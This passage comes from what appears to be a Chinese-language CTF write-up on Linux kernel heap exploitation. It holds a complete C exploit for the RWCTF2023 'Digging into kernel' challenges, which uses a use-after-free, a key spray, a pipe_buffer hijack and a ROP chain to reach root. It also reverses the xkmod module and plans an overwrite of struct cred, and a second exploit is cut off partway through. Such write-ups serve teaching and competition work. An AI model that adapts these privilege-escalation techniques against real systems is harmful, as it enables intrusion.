class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NODE_INFO_SZ 192</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_BUFFER_SZ 1024</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPRAY_NUM 40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_FREE_PAYLOAD_RCU 0xffffffff813d8210</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XCHG_RDI_RAX_DEC_RET 0xffffffff81adfc70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMDOE 0xffffffff81e00ed0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPEC_PROCESS_KEYRING  -2  <span class="hljs-comment">/* - key ID for process-specific keyring */</span></span><br><br><span class="hljs-comment">/* keyctl commands */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UPDATE     2 <span class="hljs-comment">/* update a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_REVOKE     3 <span class="hljs-comment">/* revoke a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UNLINK     9 <span class="hljs-comment">/* unlink a key from a keyring */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_READ     11  <span class="hljs-comment">/* read a key or keyring&#x27;s contents */</span></span><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffffc0000000</span>;<br><br><br><span class="hljs-type">int</span> rwctf_fd;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff81095c30</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff81096110</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span>&#123;</span><br>  <span class="hljs-type">uint32_t</span> idx;<br>  <span class="hljs-type">uint32_t</span> size;<br>  <span class="hljs-type">void</span>* buf;<br>&#125;;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>*, <span class="hljs-type">void</span>*, <span class="hljs-type">size_t</span>)</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>      <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>      <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>      <span class="hljs-string">&quot;pushf;&quot;</span><br>      <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>      );<br>  info_log(<span class="hljs-string">&quot;States has been saved successfully!&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>  <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>  CPU_ZERO(&amp;cpu_set);<br>  CPU_SET(core, &amp;cpu_set);<br>  sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>  info_log(<span class="hljs-string">&quot;bind core succesfully&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello\n&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">my_alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx, <span class="hljs-type">uint32_t</span> size, <span class="hljs-type">void</span>* buf)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">n</span> =</span> &#123;<br>    .idx = idx,<br>    .size = size,<br>    .buf = buf,<br>  &#125;;<br>  ioctl(rwctf_fd, <span class="hljs-number">0xDEADBEEF</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">my_delete</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">n</span> =</span> &#123;<br>    .idx = idx,<br>  &#125;;<br>  ioctl(rwctf_fd, <span class="hljs-number">0xC0DECAFE</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>* description, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_add_key, <span class="hljs-string">&quot;user&quot;</span>, description, payload, plen, KEY_SPEC_PROCESS_KEYRING);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_update</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_revoke</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, id, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_read</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* buffer, <span class="hljs-type">size_t</span> buflen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, id, buffer, buflen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_unlink</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, id, KEY_SPEC_PROCESS_KEYRING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span>&#123;<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  bind_cpu(<span class="hljs-number">0</span>);<br>  saveStatus();<br>  <span class="hljs-type">size_t</span>* buf;<br>  <span class="hljs-type">char</span> description[<span class="hljs-number">0x50</span>];<br>  <span class="hljs-type">int</span> key_id[KEY_SPRAY_NUM];<br>  <span class="hljs-type">int</span> victim_key_idx = <span class="hljs-number">-1</span>, kernel_offset = <span class="hljs-number">-1</span>, pipe_key_id;<br>  <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], pipe_key_ret;<br>  <span class="hljs-type">size_t</span> pipe_buffer_addr;<br><br>  buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">0x4000</span>);<br><br>  rwctf_fd = open(<span class="hljs-string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);<br>  <span class="hljs-keyword">if</span>(rwctf_fd &lt; <span class="hljs-number">0</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;/dev/rwctf had open failed!&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">   * construct the UAF obj,we just alloc and then free it to the cpu-&gt;freelist</span><br><span class="hljs-comment">   * */</span><br>  info_log(<span class="hljs-string">&quot;Construct the UAF obj&quot;</span>);<br>  my_alloc(<span class="hljs-number">0</span>, PIPE_NODE_INFO_SZ, buf);<br>  my_delete(<span class="hljs-number">0</span>);<br><br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">   * the UAF obj always be used by allocating the pre_payload,then alloc new obj for user_key_payload</span><br><span class="hljs-comment">   * so we could use the current cpu-&gt;freelist by heap sparying the user_key_payload</span><br><span class="hljs-comment">   * then the current slab will put to the kmem_cache_node,then get a new slab for allocating</span><br><span class="hljs-comment">   * finally, the UAF obj will be put into the kmem_cache_node</span><br><span class="hljs-comment">   * ======================================================================================</span><br><span class="hljs-comment">   * 1. use user_key_payload to full the cpu_freelist</span><br><span class="hljs-comment">   * 2. then we will put the current slab to the node</span><br><span class="hljs-comment">   * 3. during this time key_alloc, we finally will free the pre_payload, so we free the uaf obj in node</span><br><span class="hljs-comment">   * 4. next time we alloc pre_payload will from other slab----current cpu-&gt;freelist</span><br><span class="hljs-comment">   * 5. after that, we must to continue for sparying in order to full the current slab</span><br><span class="hljs-comment">   * 6. when the current slab full, the node slab will be put on the cpu_freelist,and use UAF obj to alloc user_key_payload</span><br><span class="hljs-comment">   * */</span><br>  info_log(<span class="hljs-string">&quot;Starting sparying the user_key_payload&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KEY_SPRAY_NUM; i++)&#123;<br>    <span class="hljs-built_in">snprintf</span>(description, <span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;%s%d&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, i);<br>    key_id[i] = key_alloc(description, buf, PIPE_NODE_INFO_SZ - <span class="hljs-number">0x18</span>);  <span class="hljs-comment">//0x18 is the user_key_payload head</span><br>    <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>      error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">//the UAF obj now be allocated as user_key_payload</span><br>  my_delete(<span class="hljs-number">0</span>);<br>  <span class="hljs-comment">//free the uaf obj, and allocate it again by second sparying,so we could modify the user_key_payload</span><br>  <span class="hljs-comment">//modify the buf,so we can overwrite the user_key_payload</span><br>  info_log(<span class="hljs-string">&quot;Starting sparying the uaf obj&quot;</span>);<br>  buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0x2000</span>;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; (KEY_SPRAY_NUM*<span class="hljs-number">2</span>); i++)&#123;<br>    my_alloc(<span class="hljs-number">0</span>, PIPE_NODE_INFO_SZ, buf);<br>  &#125;<br>  info_log(<span class="hljs-string">&quot;Sparying nearly four slab, it should be written!&quot;</span>);<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KEY_SPRAY_NUM; i++)&#123;<br>    <span class="hljs-keyword">if</span>(key_read(key_id[i], buf, <span class="hljs-number">0x4000</span>) &gt; PIPE_NODE_INFO_SZ)&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Found the victim key_idx : %d\n&quot;</span>, i);<br>      victim_key_idx = i;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      key_revoke(key_id[i]);        <span class="hljs-comment">//then the user_key_payload&#x27;s head-&gt;call_back_head will be put by user_free_payload_rcu()</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(victim_key_idx == <span class="hljs-number">-1</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;Found the victim key_id failed:(&quot;</span>);<br>  &#125;<br>  info_log(<span class="hljs-string">&quot;victim key_id founded!&quot;</span>);<br><br>  <span class="hljs-comment">/* find the rcu_head-&gt;callback_head */</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x2000</span>/<span class="hljs-number">8</span> ; i++)&#123;<br>    <span class="hljs-keyword">if</span>((buf[i]&amp;<span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x210</span>)&#123;<br>      kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;<br>      kernel_base += kernel_offset;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(kernel_offset == <span class="hljs-number">-1</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;can not find the kernel offset&quot;</span>);<br>  &#125;<br>  PRINT_ADDR(<span class="hljs-string">&quot;Kernel_base&quot;</span>, kernel_base);<br>  PRINT_ADDR(<span class="hljs-string">&quot;Kernel_offset&quot;</span>, kernel_offset);<br>  <br>  <span class="hljs-comment">/* </span><br><span class="hljs-comment">   * Let the user_key_payload and pipe_inode_info belong to the same obj</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   * */</span><br>  <span class="hljs-comment">/* Construct the freelist 0-&gt;1 */</span><br>  my_alloc(<span class="hljs-number">0</span>, PIPE_NODE_INFO_SZ, buf);<br>  my_alloc(<span class="hljs-number">1</span>, PIPE_NODE_INFO_SZ, buf);<br>  my_delete(<span class="hljs-number">1</span>);<br>  my_delete(<span class="hljs-number">0</span>);<br>  <span class="hljs-comment">/* 1 object will be the user_key_payload */</span><br>  pipe_key_id = key_alloc(<span class="hljs-string">&quot;peiwithhao&quot;</span>, buf, PIPE_NODE_INFO_SZ - <span class="hljs-number">0x18</span>);<br>  my_delete(<span class="hljs-number">1</span>);<br>  <span class="hljs-comment">/* prepare for the pipe buffer */</span><br>  my_alloc(<span class="hljs-number">0</span>, PIPE_BUFFER_SZ, buf);<br>  my_delete(<span class="hljs-number">0</span>);<br>  pipe(pipe_fd);<br>  <br>  info_log(<span class="hljs-string">&quot;Starting control the process&quot;</span>);<br>  pipe_key_ret = key_read(pipe_key_id, buf, <span class="hljs-number">0xffff</span>);<br>  <br>  pipe_buffer_addr = buf[<span class="hljs-number">16</span>];   <span class="hljs-comment">//leak the bufs</span><br>  PRINT_ADDR(<span class="hljs-string">&quot;pipe_buffer addr&quot;</span>, pipe_buffer_addr);<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-keyword">sizeof</span>(buf));<br><br>  <span class="hljs-comment">/* ROP chain construct */</span><br>  buf[<span class="hljs-number">0</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">1</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwithhao&quot;</span>;<br>  buf[<span class="hljs-number">2</span>] = pipe_buffer_addr + <span class="hljs-number">0x18</span>;<br>  buf[<span class="hljs-number">3</span>] = POP_RBX_POP_RBP_POP_R12_RET + kernel_offset;                 <br>  buf[<span class="hljs-number">4</span>] = PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET + kernel_offset;    <span class="hljs-comment">//release()</span><br>  buf[<span class="hljs-number">5</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">6</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">7</span>] = POP_RDI_RET + kernel_offset;<br>  buf[<span class="hljs-number">8</span>] = <span class="hljs-literal">NULL</span>;<br>  buf[<span class="hljs-number">9</span>] = prepare_kernel_cred + kernel_offset;<br>  buf[<span class="hljs-number">10</span>] = XCHG_RDI_RAX_DEC_RET + kernel_offset;<br>  buf[<span class="hljs-number">11</span>] = commit_creds + kernel_offset;<br>  buf[<span class="hljs-number">12</span>] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMDOE + kernel_offset + <span class="hljs-number">0x31</span>;<br>  buf[<span class="hljs-number">13</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">14</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">15</span>] = (<span class="hljs-type">size_t</span>*)get_root;<br>  buf[<span class="hljs-number">16</span>] = user_cs;<br>  buf[<span class="hljs-number">17</span>] = user_rflags;<br>  buf[<span class="hljs-number">18</span>] = user_sp + <span class="hljs-number">8</span>;<br>  buf[<span class="hljs-number">19</span>] = user_ss;<br><br>  <br>  my_delete(<span class="hljs-number">0</span>);<br>  my_alloc(<span class="hljs-number">0</span>, PIPE_BUFFER_SZ, buf);<br><br>  close(pipe_fd[<span class="hljs-number">0</span>]);<br>  close(pipe_fd[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="六、Kernel-Heap-Arbitrary-Write-x2F-Read"><a href="#六、Kernel-Heap-Arbitrary-Write-x2F-Read" class="headerlink" title="六、Kernel Heap - Arbitrary Write&#x2F;Read"></a>六、Kernel Heap - Arbitrary Write&#x2F;Read</h1><h2 id="例题：RWCTF2023体验赛-Digging-into-kernel-2"><a href="#例题：RWCTF2023体验赛-Digging-into-kernel-2" class="headerlink" title="例题：RWCTF2023体验赛-Digging into kernel 2"></a>例题：RWCTF2023体验赛-Digging into kernel 2</h2><h3 id="1-题目逆向-3"><a href="#1-题目逆向-3" class="headerlink" title="1. 题目逆向"></a>1. 题目逆向</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">xkmod_init</span><span class="hljs-params">()</span><br>&#123;<br>  kmem_cache *v0; <span class="hljs-comment">// rax</span><br><br>  printk(&amp;unk_1E4);<br>  misc_register(&amp;xkmod_device);<br>  v0 = (kmem_cache *)kmem_cache_create(<span class="hljs-string">&quot;lalala&quot;</span>, <span class="hljs-number">192LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  buf = <span class="hljs-number">0LL</span>;<br>  s = v0;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在模块初始化的时候注册了一个misc设备，然后构造一个属于自己的kmem_cache，但是由于他并没有设置其他额外的flags，所以由于kmalloc alias机制，会导致该kmem_cache会同我们内核当中的kmalloc-192一起复用，可能这并不是出题者的本意</p><p>漏洞点为关闭设备时执行的代码，存在UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">xkmod_release</span><span class="hljs-params">(inode *inode, file *file)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> kmem_cache_free(s, buf);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-easy-mode"><a href="#2-easy-mode" class="headerlink" title="2. easy mode"></a>2. easy mode</h3><p>首先咱们就利用出题者的失误来打一个较为简单的kernel pwn，这里给出以下思路</p><ol><li>首先打开多个漏洞设备，咱们设备中的buf都指向内核的bss段</li><li>然后我们关闭其中一个漏洞设备，但是其中在xkmod_release的过程当中并没有给我们的buf置空，造成了悬垂指针</li><li>此时buf指向的堆块处于freelist当中，此时若我们再次分配一个192大小的结构体，那么就会将其分配出去</li><li>我们选用大小刚刚适合的<code>struct cred</code>，然后我们利用ioctl系统调用当中的不同选项来将本进程的uid、gid什么的改0即可</li></ol><p>exp如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title 